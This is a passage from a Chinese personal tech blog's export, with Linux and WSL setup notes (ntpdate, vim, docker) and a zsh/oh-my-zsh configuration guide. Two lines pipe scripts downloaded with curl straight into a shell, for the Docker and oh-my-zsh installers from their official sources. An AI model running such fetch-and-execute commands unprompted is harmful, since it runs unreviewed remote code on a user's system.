<p>安装ntpdate : <code>sudo apt install ntpdate</code></p>
<p>同步：<code>sudo ntpdate pool.ntp.org</code></p>
<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>以下问题与 WSL 无关，与 Linux 软件配置有关</p>
<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>设置缩进4，显示行号等</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4 </span><br><span class="line">set softtabstop=4 </span><br><span class="line">set shiftwidth=4 </span><br><span class="line">set noexpandtab </span><br><span class="line">set nu #行号，看个人需求，会影响多行复制</span><br><span class="line">set autoindent </span><br><span class="line">set cindent</span><br></pre></td></tr></table></figure></div>

<p>禁用视觉模式(不检测鼠标事件)</p>
<p>打开配置文件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/share/vim/vim90/defaults.vim</span><br></pre></td></tr></table></figure></div>

<p>搜索找到 mouse 行，用<code>&quot;</code>将其注释</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;if has(&#x27;mouse&#x27;)</span><br><span class="line">&quot;  if &amp;term =~ &#x27;xterm&#x27;</span><br><span class="line">&quot;    set mouse=a</span><br><span class="line">&quot;  else</span><br><span class="line">&quot;    set mouse=nvi</span><br><span class="line">&quot;  endif</span><br><span class="line">&quot;endif</span><br></pre></td></tr></table></figure></div>

<h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>kali 的 docker-compose 版本过低，故从 Github 下载安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -SL https://github.com/docker/compose/releases/download/v2.21.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose &amp;&amp; sudo chmod 755 /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure></div>

<p>而 Ubuntu 的 docker 本身支持性就有问题，使用如下命令安装：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://get.docker.com | sh</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
        <tag>TroubleShooting</tag>
        <tag>WSL</tag>
      </tags>
  </entry>
  <entry>
    <title>zsh 配置</title>
    <url>/2023/04/28/zsh-config/</url>
    <content><![CDATA[<p>久闻 zsh 大名，但我半个月前才开始用，本文简单记录一下配置过程，算是一种备份？</p>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p><a class="link"   href="https://ohmyz.sh/" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个 zsh 配置管理器。有了它，配置 zsh ，安装插件、主题等等都不是难事。</p>
<p>安装 oh-my-zsh :</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure></div>

<p>执行后会提示配置，照着它的提示选择就行</p>
<h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><p>oh-my-zsh 自带很多插件，但是需要在 <code>~/.zshrc</code> 的 plugins 中手动加入来选择要使用的插件</p>
<p>配置示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
<p>每次修改完配置后，都需要执行 <code>source ~/.zshrc</code> 来更新配置，或者重新打开 zsh 终端</p>
<h4 id="自动补全-zsh-autosuggestions"><a href="#自动补全-zsh-autosuggestions" class="headerlink" title="自动补全 - zsh-autosuggestions"></a>自动补全 - zsh-autosuggestions</h4><p>需要另安装插件 zsh-autosuggestions</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions.git $ZSH_CUSTOM/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></div>

<h4 id="语法高亮-zsh-syntax-highlighting"><a href="#语法高亮-zsh-syntax-highlighting" class="headerlink" title="语法高亮 - zsh-syntax-highlighting"></a>语法高亮 - zsh-syntax-highlighting</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure></div>

<h4 id="交互式-cd-zsh-interactive-cd"><a href="#交互式-cd-zsh-interactive-cd" class="headerlink" title="交互式 cd - zsh-interactive-cd"></a>交互式 cd - zsh-interactive-cd</h4><p>作用是 <code>cd</code> 的时候自动列出文件夹，按 <code>TAB</code> 可以进行选择补全</p>
<p>需要安装 fzf ：<code>sudo apt install fzf -y</code></p>
<p>修改 <code>~/.zshrc</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">	...</span><br><span class="line">	zsh-interactive-cd</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<h4 id="thefuck-命令纠错"><a href="#thefuck-命令纠错" class="headerlink" title="thefuck - 命令纠错"></a>thefuck - 命令纠错</h4><p>按 <code>ESC</code> 键两次就能快速纠错上一次执行的命令</p>
<p>安装：<code>sudo apt install thefuck -y</code></p>
<p><code>plugins=(... thefuck)</code></p>
<p>注意，该插件调用方式<code>ESC</code>-<code>ESC</code>和 sudo 插件冲突</p>
<h4 id="sudo-快速-sudo"><a href="#sudo-快速-sudo" class="headerlink" title="sudo - 快速 sudo"></a>sudo - 快速 sudo</h4><p>按 <code>ESC</code> 键两次就能快速将上一次执行的命令前加上 <code>sudo</code></p>
<p><code>plugins=(... sudo)</code></p>
<p>注意，该插件调用方式 <code>ESC</code>-<code>ESC</code> 和 thefuck 插件冲突</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>操作系统</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
</search>
